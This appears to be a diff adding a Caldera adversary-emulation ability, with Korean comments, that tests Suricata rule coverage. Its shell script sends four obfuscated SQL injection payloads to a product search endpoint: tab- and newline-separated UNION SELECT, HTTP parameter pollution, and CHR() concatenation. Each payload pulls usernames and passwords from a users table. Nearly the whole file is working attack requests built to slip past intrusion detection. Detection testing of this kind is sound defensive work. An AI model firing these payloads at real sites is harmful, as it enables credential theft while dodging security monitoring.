@@ -1,0 +1,41 @@
+- id: 44d5e6f7-8a9b-4012-bdef-012345678104
+  name: SQL Injection - Advanced Evasion Variants
+  description: Tab/Newline 공백 대체, HTTP Parameter Pollution, Concat 함수 난독화 등 고급 우회 기법 4종을 추가 실행하여 Suricata 룰의 한계를 정밀 측정합니다.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027.010
+    name: Obfuscated Files or Information - Command Obfuscation
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1027.010"
+          ABILITY_ID="44d5e6f7-8a9b-4012-bdef-012345678104"
+          TARGET="http://#{target.url}"
+
+          CURL_BASE=( -s -w " HTTP=%{http_code}\n" -o /dev/null
+                      -H "X-Caldera-Op-Id: ${OP_ID}"
+                      -H "X-Caldera-Technique: ${TECH_ID}"
+                      -H "X-Caldera-Ability: ${ABILITY_ID}"
+                      -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" )
+
+          echo "[*] SQLi Advanced Evasion (4종 추가)"
+
+          echo "[5] Tab 문자 공백 대체: UNION<TAB>SELECT"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/products/search?keyword=%27%09UNION%09SELECT%09id%2Cusername%2Cpassword%2C0%2C0%09FROM%09users--"
+
+          echo "[6] Newline 공백 대체: UNION<LF>SELECT"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/products/search?keyword=%27%0aUNION%0aSELECT%0aid%2Cusername%2Cpassword%2C0%2C0%0aFROM%0ausers--"
+
+          echo "[7] HTTP Parameter Pollution: 이중 keyword"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/products/search?keyword=laptop&keyword=%27+UNION+SELECT+id%2Cusername%2Cpassword%2C0%2C0+FROM+users--"
+
+          echo "[8] Concat 함수 난독화: CHR() 사용"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/products/search?keyword=%27+UNION+SELECT+id%2Cusername%2Cpassword%2CCHR(48)%2CCHR(48)+FROM+users--"
+
+          echo "[*] Advanced Evasion 종료"
